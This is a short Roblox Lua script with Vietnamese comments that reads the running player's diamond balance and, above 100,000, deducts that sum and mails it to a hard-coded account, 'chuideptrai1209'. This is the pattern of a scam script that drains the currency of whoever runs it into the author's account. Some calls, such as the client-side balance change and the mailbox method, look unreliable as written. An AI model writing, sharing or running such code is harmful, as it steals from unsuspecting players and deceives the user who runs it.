local player = game:GetService("Players").LocalPlayer
local leaderstats = player.leaderstats
local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value

print("Số lượng kim cương:", diamonds) -- In ra giá trị kim cương trên console

local MailboxMachine = workspace.Map["1 | Spawn"].INTERACT.Machines.MailboxMachine

if diamonds >= 100000 then
    -- Giảm số lượng kim cương của người chơi đi 100,000
    leaderstats["\240\159\146\142 Diamonds"].Value = diamonds - 100000
    
    -- Gửi 100,000 kim cương cho tài khoản "chuideptrai1209"
    local Mailbox = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox
    Mailbox:SendDiamondsToPlayer("chuideptrai1209", 100000)
    
    -- Di chuyển người chơi đến MailboxMachine
    player.Character:MoveTo(MailboxMachine.Position)
end
